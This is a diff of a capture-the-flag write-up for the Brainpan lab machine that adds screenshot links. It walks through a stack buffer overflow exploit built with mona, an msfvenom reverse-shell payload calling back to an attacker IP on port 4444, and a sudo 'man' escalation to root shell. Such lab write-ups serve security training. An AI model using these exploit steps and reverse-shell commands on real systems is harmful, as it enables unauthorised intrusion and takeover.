@@ -13,7 +13,7 @@ nmap -sC -sV -p- --min-rate 5000 IP
 
 With -p- we indicate that we want it to look at all ports,  -sC we indicate that we want to run the default nmap scripts, -sV to get the service versions and the --min-rate 5000 to do it very fast.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/1.PNG)
 
 It has two open ports, one web and something we don't know what it is, let's connect via netcat to that port.
 
@@ -21,11 +21,11 @@ It has two open ports, one web and something we don't know what it is, let's con
 nc IP 9999
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/2.PNG)
 
 It looks like the program with which we have to do the BoF; now let's go to the web.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/3.PNG)
 
 There doesn't seem to be much, let's do some directory fuzzing to see if there is anything we don't see.
 
@@ -37,21 +37,29 @@ Where it says WORDLIST put the path of the wordlist, in IP put the IP of the tar
 
 We get a /bin, let's see what it is.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/4.PNG)
 
 Let's check which architecture it is to open it with x32 or x64
 
-FOTO 6
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/6.PNG)
 
 Ok, looks like the 9999 port binary to exploit it locally before going to the app; let's download it and exploit it on windows with [x64dbg](https://github.com/therealdreg/x64dbg-exploiting/releases/download/1.1/x64dbg-exploitingv1.1.zip), by the way, I have several [demos](https://github.com/therealdreg/x64dbg-exploiting) made in the official repo.
 
 To install the x64dbg with plugins and so on we have to follow the [instructions](https://github.com/therealdreg/x64dbg-exploiting) of the official repo.
 
-FOTO 7-11
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/7.PNG)
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/8.PNG)
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/9.PNG)
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/10.PNG)
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/11.PNG)
 
 Make sure to create the logs folder inside C:
 
-FOTO 5
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/5.PNG)
 
 To configure the logs folder we have to put the following:
 
@@ -59,23 +67,23 @@ To configure the logs folder we have to put the following:
 mona.mona("config -set workingfolder c:\\logs\\%p")
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/12.PNG)
 
 If the previous commands were successful, it should look like this
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/13.PNG)
 
 Now hit File->Open and select the vulnerable program
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/14.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/15.PNG)
 
 Click two times on the Run icon to open the program
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/16.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/17.PNG)
 
 Perfect, let's start with the attack, first we must find out how many characters we have to put to overflow the stack; to do this, without leaving the log we put the following command:
 
@@ -83,11 +91,11 @@ Perfect, let's start with the attack, first we must find out how many characters
 mona.mona("pattern_create 1000")
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/18.PNG)
 
 Copy the output of the command and paste it into a .txt file
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/19.PNG)
 
 Now let's start the script to do our local testing:
 
@@ -107,11 +115,11 @@ s.send((buffer))
 s.close()
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/20.PNG)
 
 Now execute the exploit.
 
-FOTO 22
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/22.PNG)
 
 Once finished, we go to log and type the following command to find out the offset needed for the bof
 
@@ -119,11 +127,11 @@ Once finished, we go to log and type the following command to find out the offse
 mona.mona("pattern_offset EIP")
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/21.PNG)
 
-FOTO 23
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/23.PNG)
 
-FOTO 24
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/24.PNG)
 
 As we can see, it tells us that there are 524 characters, taking this into account, let's modify the script:
 
@@ -131,7 +139,7 @@ As we can see, it tells us that there are 524 characters, taking this into accou
 buffer = '\x41' * 524
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/25.PNG)
 
 For now our script only has the overflow characters, now we have to find out the badchars for the shellcode
 
@@ -141,9 +149,9 @@ First we go to log and put this:
 mona.mona("bytearray")
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/26.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/27.PNG)
 
 We copy the characters and insert them at the end of the script like this:
 
@@ -158,27 +166,27 @@ buffer += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\
 buffer += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/28.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/29.PNG)
 
 Now restart the app and then run the exploit
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/30.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/31.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/32.PNG)
 
 When finished we will see if the characters were copied, go to cpu->lower left window and right click->go to->expression and set esp.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/33.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/34.PNG)
 
 As we can see, nothing has been copied, 00 badchar
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/35.PNG)
 
 Go to log and generate another bytearray without 00 with:
 
@@ -186,33 +194,33 @@ Go to log and generate another bytearray without 00 with:
 mona.mona('bytearray -cpb "\\x00"')
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/36.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/37.PNG)
 
 Now we copy the output again, put it in the exploit removing the previous one, run it, and so on until we have all the badchars; I am going to do it only with images to make it faster; remember to restart the program every time you run the exploit
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/38.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/39.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/40.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/41.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/42.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/43.PNG)
 
 Apparently only the 00 was a badchar, now, let's locate some memory space that does not change with each execution, that is, that does not have ASLR.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/44.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/45.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/46.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/47.PNG)
 
 Now we are going to use mona to see if we can locate any jmp esp of a .dll and then put the shellcode at the top of the stack and then we will have the return address that we have to put after the script characters to execute the shellcode once we have it.
 
@@ -222,11 +230,11 @@ We go to log and execute:
 mona.mona("jmp -r esp")
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/48.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/49.PNG)
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/50.PNG)
 
 There is only one memory address that jumps to esp and it is quite useful, let's add it to the script.
 
@@ -249,7 +257,7 @@ s.send((buffer))
 s.close()
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/51.PNG)
 
 Now we only need the shellcode itself, for this, we are going to use msfvenom with the following syntax:
 
@@ -257,7 +265,7 @@ Now we only need the shellcode itself, for this, we are going to use msfvenom wi
 msfvenom -p windows/shell_reverse_tcp LHOST=10.8.155.220 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/52.PNG)
 
 Finally we would only have to modify the script adding that shellcode and changing the target by the real target and execute, but first we have to open the port that we have put in the msfvenom.
 
@@ -293,11 +301,11 @@ s.send((buffer))
 s.close()
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/53.PNG)
 
 And we're in! Let's escalate privileges now.
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/54.PNG)
 
 Let's see the sudo -l of our user
 
@@ -305,11 +313,11 @@ Let's see the sudo -l of our user
 sudo -l
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/55.PNG)
 
 We see an executable of its own that when executed we can see that one of the options is the man command, let's see if it has an entry in [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/56.PNG)
 
 If it has, let's use it to see if it works.
 
@@ -319,10 +327,8 @@ manual man
 !/bin/sh
 ```
 
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/57.PNG)
 
-FOTO
-
-FOTO
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/58.PNG)
 
 And there it is, we are root!
